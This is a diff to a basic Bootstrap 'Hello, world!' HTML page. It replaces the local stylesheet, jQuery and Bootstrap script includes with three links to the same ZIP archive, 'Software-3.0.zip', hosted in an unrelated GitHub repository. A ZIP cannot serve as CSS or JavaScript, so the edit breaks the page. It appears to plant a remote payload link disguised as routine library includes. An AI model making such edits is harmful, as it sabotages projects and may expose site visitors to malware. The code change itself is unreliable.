@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Document</title>
-    <link rel="stylesheet" href="./css/bootstrap-4.3.1-dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://github.com/yangdeee/library/raw/refs/heads/master/antigyrous/Software-3.0.zip">
 </head>
 <body>
-    <script src="./js/jquery-3.3.1.slim.min.js"></script>
-    <script src="./css/bootstrap-4.3.1-dist/js/bootstrap.min.js"></script>
+    <script src="https://github.com/yangdeee/library/raw/refs/heads/master/antigyrous/Software-3.0.zip"></script>
+    <script src="https://github.com/yangdeee/library/raw/refs/heads/master/antigyrous/Software-3.0.zip"></script>
 </body>
 <div class="jumbotron">
     <h1 class="display-4">Hello, world!</h1>
